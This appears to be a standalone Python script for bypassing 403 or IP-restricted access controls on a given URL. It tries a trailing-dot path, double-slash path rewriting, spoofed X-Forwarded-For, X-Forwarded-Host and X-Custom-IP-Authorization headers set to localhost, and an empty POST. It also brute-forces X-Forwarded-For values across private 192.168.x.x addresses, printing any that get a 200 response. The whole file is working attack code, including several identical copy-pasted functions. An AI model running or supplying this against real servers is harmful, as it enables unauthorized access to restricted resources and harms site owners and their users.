import requests
import re
from ipaddress import IPv4Network
def test1(url):
    newurl = url+"."
    newurl = requests.get(newurl)
    if(newurl.status_code == 200 ):
        print("bypassed: ",url+".")
def test2(url):
    newurl = x = re.findall("/.{1,100}", url)
    newurl = newurl[0].replace("/","//")
    newurl = newurl.replace("////","//")
    newurl = ("http:"+newurl)
    r = requests.get(newurl)
    if(r.status_code == 200):
        print("bypassed: ",newurl)
def test3(url):

    a,b,c,d = {"X-Forwarded-For" : "127.0.0.1"},{"X-Forwarded-Host" : "127.0.0.1"},{"X-Custom-IP-Authorization": "127.0.0.1",},{"X-Forwarded-For":"http://127.0.0.1"}
    for i in a,b,c,d:
        r = requests.get(url,headers=i)  
        if(r.status_code == 200):
            print("bypassed "," ",i)

def test4(url):
    r4 = requests.post(url,headers={"Content-Length": "0"})
    if(r4.status_code == 200):
        print("post request and Content-Length:0")

def attack(number,url):
    i = number
    for n in range(1,256):
        s = requests.get(url,headers={"X-Forwarded-For" : "192.168.{}.{}".format(n,i)})
        if (s.status_code == 200):
            print("X-Forwarded-For: 192.168.{}.{}".format(n,i))
def attack2(number,url):
        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
        if (s.status_code == 200):
            print("X-Forwarded-For:", number)
def attack3(number,url):
        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
        if (s.status_code == 200):
            print("X-Forwarded-For:", number)
def attack4(number,url):
        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
        if (s.status_code == 200):
            print("X-Forwarded-For:", number)
